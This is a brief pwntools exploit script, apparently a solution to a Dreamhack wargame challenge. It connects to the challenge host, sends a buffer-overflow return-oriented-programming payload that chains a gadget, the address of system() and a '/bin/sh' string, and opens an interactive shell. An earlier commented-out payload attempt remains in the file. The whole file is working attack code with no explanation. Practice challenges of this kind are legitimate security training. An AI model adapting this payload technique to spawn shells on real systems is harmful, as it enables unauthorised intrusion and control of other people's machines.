from pwn import *

p = remote("host1.dreamhack.games", 17812)
elf = ELF('./prob')

# system = 0x40082c
# system = elf.symbols['system']
# binsh = 0x4671c8
# ldr_x0_sp_ret = 0x4426a4
# system = 0x401630
# binsh = 0x4671b0

# payload = b'a' * 0x18
# payload += p64(ldr_x0_sp_ret)
# payload += p64(binsh)
# payload += p64(system)

# # print(hex(system))
# p.send(payload)
# p.interactive()

sh_addr = 0x4671c8
do_system = elf.symbols['system']

payload = p64(0x0)*2 + p64(0x0) + p64(0x435e38)
payload += (p64(0x0) + p64(do_system) + b'A'*0x50 + p64(sh_addr))

p.sendline(payload)

p.interactive()